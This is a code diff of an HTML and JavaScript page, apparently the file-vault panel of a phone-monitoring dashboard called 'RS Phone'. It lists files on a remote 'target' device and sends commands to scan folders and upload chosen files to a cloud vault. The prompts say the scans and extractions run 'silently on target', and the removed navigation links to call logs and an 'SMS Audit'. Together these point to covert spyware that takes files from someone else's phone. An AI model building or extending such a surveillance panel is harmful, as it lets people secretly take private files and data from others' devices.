@@ -3,480 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Storage Catalog - RS OWNER</title>
+    <title>RS Phone - Secure File Vault</title>
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        /* =========================================================
-           RS PHONE - ZERO-LAG FLAT ARCHITECTURE (INJECTED STYLE)
-           ========================================================= */
-        :root {
-            --bg-main: #121212;
-            --bg-card: #1e1e1e;
-            --text-main: #ffffff;
-            --text-muted: #aaaaaa;
-            --accent-cyan: #00f0ff;
-            --accent-green: #10b981;
-            --accent-red: #ef4444;
-            
-            /* Flat Status Colors */
-            --color-dark: #2c3e50;
-            --color-green-alt: #2ecc71;
-            --color-blue: #2980b9;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            -webkit-font-smoothing: antialiased;
-        }
-
-        body {
-            background-color: var(--bg-main);
-            color: var(--text-main);
-            min-height: 100vh;
-            padding: 15px;
-            padding-bottom: 40px;
-            overflow-x: hidden;
-        }
-
-        /* Custom Scrollbar */
-        ::-webkit-scrollbar { width: 6px; height: 6px; }
-        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.1); }
-        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
-        ::-webkit-scrollbar-thumb:hover { background: var(--accent-cyan); }
-
-        /* Sidebar & Layout */
-        .app-container { display: flex; min-height: 100vh; gap: 20px; }
-        .sidebar { width: 260px; background: var(--bg-card); padding: 20px; border-radius: 16px; border: 1px solid #2c2c2e; display: flex; flex-direction: column; gap: 25px; }
-        .sidebar-brand { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 800; letter-spacing: 1px; color: var(--text-main); }
-        .sidebar-menu { list-style: none; display: flex; flex-direction: column; gap: 8px; }
-        .sidebar-menu li a { display: flex; align-items: center; gap: 12px; padding: 12px 16px; color: var(--text-muted); text-decoration: none; border-radius: 8px; font-weight: 600; font-size: 14px; transition: all 0.2s; }
-        .sidebar-menu li.active a, .sidebar-menu li a:hover { background: rgba(0, 240, 255, 0.08); color: var(--accent-cyan); }
-        
-        .main-content { flex: 1; display: flex; flex-direction: column; gap: 20px; }
-        .topbar { display: flex; justify-content: space-between; align-items: center; padding-bottom: 15px; border-bottom: 1px solid #2c2c2e; }
-        .glass-panel { background: var(--bg-card); border: 1px solid #2c2c2e; border-radius: 16px; padding: 25px; }
-
-        /* =========================================================
-           STORAGE SPECIFIC STYLES
-           ========================================================= */
-        .file-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
-            gap: 20px;
-            padding: 15px 0;
-            max-height: 65vh;
-            overflow-y: auto;
-            padding-right: 10px;
-        }
-        
-        .file-item {
-            background: rgba(255,255,255,0.02);
-            border-radius: 12px;
-            padding: 20px 15px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            border: 1px solid rgba(255,255,255,0.05);
-            position: relative;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: space-between;
-            min-height: 140px;
-        }
-        
-        .file-item:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
-            border-color: var(--accent-cyan);
-            background: rgba(255,255,255,0.05);
-        }
-
-        .file-item.blocked {
-            opacity: 0.5;
-            background: repeating-linear-gradient(
-                45deg,
-                rgba(30, 30, 30, 1),
-                rgba(30, 30, 30, 1) 10px,
-                rgba(20, 20, 20, 1) 10px,
-                rgba(20, 20, 20, 1) 20px
-            );
-            border-color: rgba(239, 68, 68, 0.3);
-        }
-
-        .file-item.blocked:hover {
-            transform: none;
-            box-shadow: none;
-            border-color: rgba(239, 68, 68, 0.5);
-            cursor: not-allowed;
-        }
-
-        .file-icon {
-            width: 48px;
-            height: 48px;
-            margin-bottom: 15px;
-            transition: transform 0.3s ease;
-        }
-
-        .file-item:hover:not(.blocked) .file-icon {
-            transform: scale(1.1);
-        }
-
-        .file-name {
-            font-size: 0.9rem;
-            font-weight: 600;
-            color: var(--text-main);
-            word-break: break-all;
-            display: -webkit-box;
-            -webkit-line-clamp: 2;
-            -webkit-box-orient: vertical;
-            overflow: hidden;
-            margin-bottom: 8px;
-            line-height: 1.3;
-        }
-
-        .file-meta {
-            font-size: 0.75rem;
-            color: var(--text-muted);
-            background: rgba(0,0,0,0.4);
-            padding: 4px 10px;
-            border-radius: 12px;
-            width: fit-content;
-        }
-
-        .status-badge {
-            position: absolute;
-            top: -8px;
-            right: -8px;
-            padding: 4px 8px;
-            border-radius: 20px;
-            font-size: 0.65rem;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-        }
-        .badge-ready { background: var(--accent-green); color: #000; }
-        .badge-blocked { background: var(--accent-red); color: #fff; }
-        .badge-cloud { background: var(--accent-cyan); color: #000; }
-
-        .breadcrumb-container {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 25px;
-            background: rgba(255,255,255,0.02);
-            padding: 12px 20px;
-            border-radius: 12px;
-            border: 1px solid rgba(255,255,255,0.05);
-        }
-
-        .back-btn {
-            background: rgba(255,255,255,0.1); border: none; color: white;
-            padding: 8px 15px; border-radius: 8px; cursor: pointer;
-            display: flex; align-items: center; gap: 6px; font-weight: 600;
-            transition: background 0.2s;
-        }
-        .back-btn:hover { background: rgba(255,255,255,0.2); }
-        
-        .path-text {
-            font-family: 'Courier New', Courier, monospace; font-size: 0.95rem;
-            color: var(--accent-cyan); word-break: break-all;
-        }
-        
-        .btn-sync {
-            background: linear-gradient(135deg, var(--accent-cyan), #3b82f6);
-            color: white; border: none; border-radius: 8px; padding: 10px 20px;
-            cursor: pointer; font-weight: bold; display: flex; align-items: center; gap: 8px;
-            box-shadow: 0 4px 12px rgba(6, 182, 212, 0.3);
-            transition: opacity 0.2s;
-        }
-        .btn-sync:hover { opacity: 0.9; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
+        body { background-color: #121212; color: #ffffff; padding: 20px; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 15px; }
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .back-btn { background: #2a2a2a; border: none; border-radius: 8px; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; cursor: pointer; color: #fff; text-decoration: none; }
+        .btn { padding: 10px 15px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; background: #3498db; color: white; display: flex; align-items: center; gap: 8px; }
+        .btn-warning { background: #f39c12; }
+        .table-container { background: #1e1e1e; border-radius: 8px; overflow: hidden; }
+        table { width: 100%; border-collapse: collapse; text-align: left; }
+        th, td { padding: 15px; border-bottom: 1px solid #333; }
+        th { background: #2a2a2a; color: #aaa; text-transform: uppercase; font-size: 12px; }
+        tr:hover { background: #252525; }
+        .status-badge { padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
+        .status-cloud { background: rgba(46, 204, 113, 0.2); color: #2ecc71; border: 1px solid #2ecc71; }
+        .status-device { background: rgba(243, 156, 18, 0.2); color: #f39c12; border: 1px solid #f39c12; }
     </style>
 </head>
 <body>
-    <div class="app-container">
-        <!-- Sidebar Unified Navigation -->
-        <div class="sidebar">
-            <div class="sidebar-brand">
-                <i data-lucide="shield" style="color: var(--accent-cyan);"></i>
-                <span>RS OWNER</span>
+
+    <div class="header">
+        <div class="header-left">
+            <a href="/remote-center" class="back-btn"><i data-lucide="chevron-left"></i></a>
+            <div>
+                <h2>File Vault</h2>
+                <div style="font-size: 12px; color: #888; margin-top: 4px;" id="device-status">Connecting to target...</div>
             </div>
-            <ul class="sidebar-menu">
-                <li><a href="/dashboard"><i data-lucide="layout-dashboard"></i> Overview</a></li>
-                <li><a href="/communication.html"><i data-lucide="message-circle"></i> Comm Hub</a></li>
-                <li><a href="/remote_center.html"><i data-lucide="cpu"></i> Remote Ops</a></li>
-                <li><a href="/calls"><i data-lucide="phone"></i> Call Logs</a></li>
-                <li><a href="/messages"><i data-lucide="message-square"></i> SMS Audit</a></li>
-                <li class="active"><a href="/files"><i data-lucide="folder-open"></i> Storage</a></li>
-            </ul>
         </div>
-        
-        <main class="main-content">
-            <header class="topbar">
-                <h2 style="font-weight: 800; letter-spacing: 1px; text-transform: uppercase; color: #fff;">File System Explorer</h2>
-                <div class="device-switcher" style="display: flex; align-items: center; gap: 15px;">
-                    <select id="device-select" style="padding: 8px 12px; border-radius: 6px; background: #1e1e1e; color: white; border: 1px solid #333; outline: none; font-weight: 600; cursor: pointer;"></select>
-                    <button class="btn-sync" onclick="requestStorageSync()">
-                        <i data-lucide="refresh-cw" style="width: 18px; height: 18px;"></i> Deep Scan Device
-                    </button>
-                </div>
-            </header>
-
-            <div class="glass-panel" style="padding: 20px;">
-                <!-- Modern Breadcrumb -->
-                <div class="breadcrumb-container" id="path-breadcrumb" style="display: none;">
-                    <button class="back-btn" onclick="window.filesEngine.goUp()">
-                        <i data-lucide="chevron-left" style="width: 18px; height: 18px;"></i> Back
-                    </button>
-                    <i data-lucide="hard-drive" style="color: var(--text-muted); width: 20px;"></i>
-                    <span class="path-text" id="current-path-text">/</span>
-                </div>
-
-                <!-- Main File Grid -->
-                <div class="file-grid" id="files-list">
-                    <div style="color: var(--text-muted); text-align: center; grid-column: 1 / -1; padding: 60px; font-size: 1.1rem;">
-                        <i data-lucide="lock" style="width: 40px; height: 40px; margin-bottom: 15px; opacity: 0.5;"></i><br>
-                        Establishing secure tracking tunnel...
-                    </div>
-                </div>
-            </div>
-        </main>
+        <div>
+            <button class="btn btn-warning" onclick="triggerDirectoryScan('/')">
+                <i data-lucide="scan" style="width:16px;"></i> Deep Scan Root (/)
+            </button>
+        </div>
     </div>
 
-    <!-- EMBEDDED JAVASCRIPT LOGIC -->
+    <div class="table-container">
+        <table>
+            <thead>
+                <tr>
+                    <th>Type</th>
+                    <th>File Name</th>
+                    <th>Size</th>
+                    <th>Status</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <tbody id="file-table-body">
+                <tr><td colspan="5" style="text-align: center; color: #888;">Loading directory structure...</td></tr>
+            </tbody>
+        </table>
+    </div>
+
     <script>
-        class FilesEngine {
-            constructor() {
-                this.activeDeviceId = localStorage.getItem('active_device_id');
-                this.currentPath = '/';
-                this.init();
-            }
+        lucide.createIcons();
+        const deviceId = localStorage.getItem('active_device_id');
+        const token = localStorage.getItem('owner_token');
 
-            async init() {
-                await this.loadDevicesList();
-                if (!this.activeDeviceId) return;
-                this.fetchDirectory(this.currentPath);
-            }
+        if (!deviceId) alert("Critical: No active target selected!");
 
-            async loadDevicesList() {
-                const token = localStorage.getItem('owner_token');
-                try {
-                    const res = await fetch('/api/devices', {
-                        headers: { 'Authorization': `Bearer ${token}` }
-                    });
-                    const result = await res.json();
-
-                    if (result.status === 'success') {
-                        const selectEl = document.getElementById('device-select');
-                        if (selectEl) {
-                            selectEl.innerHTML = ''; 
-                            if (result.data.length === 0) {
-                                selectEl.innerHTML = '<option value="">No Devices Found</option>';
-                                return;
-                            }
-                            result.data.forEach(dev => {
-                                const option = document.createElement('option');
-                                option.value = dev.id;
-                                option.textContent = dev.name;
-                                selectEl.appendChild(option);
-                            });
-                            if (!this.activeDeviceId && result.data.length > 0) {
-                                this.activeDeviceId = result.data[0].id;
-                                localStorage.setItem('active_device_id', this.activeDeviceId);
-                            }
-                            selectEl.value = this.activeDeviceId;
-                            selectEl.addEventListener('change', (e) => {
-                                this.activeDeviceId = e.target.value;
-                                localStorage.setItem('active_device_id', this.activeDeviceId);
-                                this.currentPath = '/'; 
-                                this.fetchDirectory(this.currentPath); 
-                            });
-                        }
-                    }
-                } catch (e) {
-                    console.error("Failed to load device matrices:", e);
-                }
-            }
-
-            async fetchDirectory(path) {
-                const token = localStorage.getItem('owner_token');
-                const container = document.getElementById('files-list');
+        // 1. Fetch File Tree from Backend
+        async function fetchFileTree() {
+            try {
+                const res = await fetch(`/api/devices/${deviceId}/files?path=/`);
+                const result = await res.json();
                 
-                container.innerHTML = `
-                    <div style="color: var(--text-muted); text-align: center; grid-column: 1 / -1; padding: 60px;">
-                        <i data-lucide="loader" class="lucide-spin" style="width: 40px; height: 40px; margin-bottom: 15px;"></i><br>
-                        Scanning safe sandbox storage layer...
-                    </div>`;
-                    
-                document.getElementById('path-breadcrumb').style.display = 'flex';
+                const tbody = document.getElementById('file-table-body');
+                tbody.innerHTML = '';
 
-                try {
-                    const encodedPath = encodeURIComponent(path);
-                    const res = await fetch(`/api/files?device_id=${this.activeDeviceId}&path=${encodedPath}`, {
-                        headers: { 'Authorization': `Bearer ${token}` }
-                    });
-                    const result = await res.json();
-                    
-                    if (result.status === 'success') {
-                        this.updateBreadcrumb(path);
-                        this.renderFiles(result.data);
-                    } else {
-                        container.innerHTML = `<div style="color: var(--accent-red); text-align: center; grid-column: 1 / -1; padding: 40px; font-weight: bold;">System Error: ${result.message}</div>`;
-                    }
-                } catch (e) {
-                    container.innerHTML = '<div style="color: var(--accent-red); text-align: center; grid-column: 1 / -1; padding: 40px; font-weight: bold;">Network failure establishing directory stream tunnel.</div>';
-                }
-            }
-
-            renderFiles(items) {
-                const container = document.getElementById('files-list');
-                
-                if (items.length === 0) {
-                    container.innerHTML = `
-                        <div style="color: var(--text-muted); text-align: center; grid-column: 1 / -1; padding: 60px;">
-                            <i data-lucide="folder-open" style="width: 48px; height: 48px; opacity: 0.3; margin-bottom: 10px;"></i><br>
-                            No content indexed in this catalog direction.
-                        </div>`;
-                    if (window.lucide) lucide.createIcons();
-                    return;
-                }
-
-                container.innerHTML = items.map(item => {
-                    const isFolder = item.is_directory === true || item.type === 'directory';
-                    const icon = isFolder ? 'folder' : this.getFileIcon(item.file_name);
-                    const iconColor = isFolder ? 'var(--accent-cyan)' : 'var(--text-main)';
-                    
-                    const sizeInBytes = item.size_bytes || 0;
-                    const sizeLimit = 12 * 1024 * 1024; 
-                    const isOversized = !isFolder && sizeInBytes > sizeLimit;
-                    
-                    let clickAction = '';
-                    let extraClass = '';
-                    let badgeHtml = '';
-
-                    if (isFolder) {
-                        clickAction = `window.filesEngine.openFolder('${item.file_name.replace(/'/g, "\\'")}')`;
-                    } else if (isOversized) {
-                        clickAction = `alert('Strict Policy: File size exceeds the 12MB optimization limit to safeguard target battery assets.')`;
-                        extraClass = 'blocked';
-                        badgeHtml = `<span class="status-badge badge-blocked">> 12MB</span>`;
-                    } else {
-                        const fullPath = this.currentPath === '/' ? `/${item.file_name}` : `${this.currentPath}/${item.file_name}`;
-                        const fileUrl = item.file_url ? `'${item.file_url}'` : 'null';
-                        clickAction = `window.filesEngine.downloadOrRequestFile('${item.file_name.replace(/'/g, "\\'")}', '${fullPath.replace(/'/g, "\\'")}', ${fileUrl})`;
+                if (result.data && result.data.length > 0) {
+                    result.data.forEach(file => {
+                        const icon = file.is_directory ? 'folder' : 'file';
+                        const size = file.is_directory ? '--' : (file.size_bytes / 1024 / 1024).toFixed(2) + ' MB';
                         
-                        if (item.file_url) {
-                            badgeHtml = `<span class="status-badge badge-ready">Ready</span>`;
+                        let statusHtml = file.is_downloaded 
+                            ? `<span class="status-badge status-cloud">In Cloud Vault</span>`
+                            : `<span class="status-badge status-device">On Device Only</span>`;
+
+                        let actionHtml = '';
+                        if (file.is_directory) {
+                            actionHtml = `<button class="btn" style="background:#555; font-size:11px;" onclick="triggerDirectoryScan('${file.folder_path}${file.file_name}/')">Scan Folder</button>`;
+                        } else if (file.is_downloaded && file.file_url) {
+                            actionHtml = `<a href="${file.file_url}" target="_blank" class="btn" style="background:#2ecc71; font-size:11px; text-decoration:none;">View / Download</a>`;
                         } else {
-                            badgeHtml = `<span class="status-badge badge-cloud"><i data-lucide="cloud" style="width:12px; height:12px;"></i></span>`;
+                            actionHtml = `<button class="btn" style="font-size:11px;" onclick="extractSpecificFile('${file.folder_path}${file.file_name}')">Extract to Cloud</button>`;
                         }
-                    }
 
-                    const displaySize = isFolder ? 'Folder' : ((sizeInBytes / (1024 * 1024)).toFixed(2) + ' MB');
-
-                    return `
-                    <div class="file-item ${extraClass}" onclick="${clickAction}">
-                        ${badgeHtml}
-                        <i data-lucide="${icon}" class="file-icon" style="color: ${iconColor};"></i>
-                        <div style="width: 100%;">
-                            <div class="file-name" title="${item.file_name}">${item.file_name}</div>
-                            <div class="file-meta">${displaySize}</div>
-                        </div>
-                    </div>
-                    `;
-                }).join('');
-                
-                if (window.lucide) lucide.createIcons();
-            }
-
-            getFileIcon(filename) {
-                if (!filename) return 'file';
-                const ext = filename.split('.').pop().toLowerCase();
-                if (['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext)) return 'image';
-                if (['mp4', 'mkv', 'avi', 'mov'].includes(ext)) return 'film';
-                if (['pdf', 'doc', 'docx', 'txt', 'csv'].includes(ext)) return 'file-text';
-                if (['zip', 'rar', 'apk', 'tar'].includes(ext)) return 'package';
-                return 'file';
-            }
-
-            openFolder(folderName) {
-                this.currentPath = this.currentPath === '/' ? `/${folderName}` : `${this.currentPath}/${folderName}`;
-                this.fetchDirectory(this.currentPath);
-            }
-
-            goUp() {
-                if (this.currentPath === '/') return; 
-                const pathParts = this.currentPath.split('/').filter(p => p !== '');
-                pathParts.pop(); 
-                this.currentPath = pathParts.length === 0 ? '/' : '/' + pathParts.join('/');
-                this.fetchDirectory(this.currentPath);
-            }
-
-            updateBreadcrumb(path) {
-                document.getElementById('current-path-text').innerText = path;
-            }
-
-            async downloadOrRequestFile(fileName, fullPath, fileUrl) {
-                if (fileUrl && fileUrl.startsWith('http')) {
-                    window.open(fileUrl, '_blank');
-                    return;
-                }
-
-                const isConfirmed = confirm(`Trigger background file extraction?\n\nTarget device agent will securely sync "${fileName}" onto the dashboard storage cloud allocation.`);
-                if (!isConfirmed) return;
-
-                const token = localStorage.getItem('owner_token');
-
-                try {
-                    const res = await fetch(`/api/devices/${this.activeDeviceId}/action`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
-                        body: JSON.stringify({ 
-                            action: `upload_specific_file:${fullPath}` 
-                        })
+                        tbody.innerHTML += `
+                            <tr>
+                                <td><i data-lucide="${icon}"></i></td>
+                                <td>${file.file_name}</td>
+                                <td>${size}</td>
+                                <td>${statusHtml}</td>
+                                <td>${actionHtml}</td>
+                            </tr>
+                        `;
                     });
-
-                    const data = await res.json();
-                    if (data.status === 'success') {
-                        alert(`Extraction command dispatched to queue! The file badge will switch to "Ready" once fully uploaded.`);
-                    } else {
-                        alert(`Command Execution Failed: ${data.message}`);
-                    }
-                } catch (error) {
-                    alert('Action Gateway Unreachable.');
+                    lucide.createIcons();
+                } else {
+                    tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: #888;">No files mapped yet. Click Deep Scan.</td></tr>`;
                 }
+            } catch (e) {
+                console.error("Fetch error:", e);
             }
         }
 
-        window.filesEngine = null;
-
-        window.requestStorageSync = async function() {
-            const isConfirmed = confirm("Dispatch deep scan directive onto target context filesystem?");
-            if (!isConfirmed) return;
-
-            const token = localStorage.getItem('owner_token');
-            const deviceId = localStorage.getItem('active_device_id');
-
+        // 2. FCM Trigger: Scan Directory
+        async function triggerDirectoryScan(path) {
+            if (!confirm(`Deploy silent scan on directory: ${path}?`)) return;
             try {
-                await fetch(`/api/devices/${deviceId}/action`, {
+                const res = await fetch(`/api/devices/${deviceId}/action`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
-                    body: JSON.stringify({ action: "sync_file_tree" })
+                    headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: `SYNC_FILE_TREE:${path}` })
                 });
-                alert("Deep Scan transaction injected successfully.");
-            } catch (e) {
-                alert("Failed to reach processing cluster.");
-            }
-        };
+                const result = await res.json();
+                if(result.status === 'success') {
+                    alert("Scan command deployed via FCM. Refreshing view in 5 seconds...");
+                    setTimeout(fetchFileTree, 5000);
+                } else alert("Dispatch failed: " + result.message);
+            } catch(e) { alert("Network exception."); }
+        }
 
-        document.addEventListener('DOMContentLoaded', () => {
-            window.filesEngine = new FilesEngine();
-            if (window.lucide) lucide.createIcons();
-        });
+        // 3. FCM Trigger: Extract File
+        async function extractSpecificFile(fullPath) {
+            if (!confirm(`Extract file ${fullPath} from device to cloud vault? This may take time based on network.`)) return;
+            try {
+                const res = await fetch(`/api/devices/${deviceId}/action`, {
+                    method: 'POST',
+                    headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: `UPLOAD_SPECIFIC_FILE:${fullPath}` })
+                });
+                const result = await res.json();
+                if(result.status === 'success') {
+                    alert("Extraction initiated silently on target. Check back in a few minutes.");
+                } else alert("Dispatch failed: " + result.message);
+            } catch(e) { alert("Network exception."); }
+        }
+
+        // Init
+        document.getElementById('device-status').innerText = `Target ID: ${deviceId}`;
+        fetchFileTree();
     </script>
 </body>
 </html>
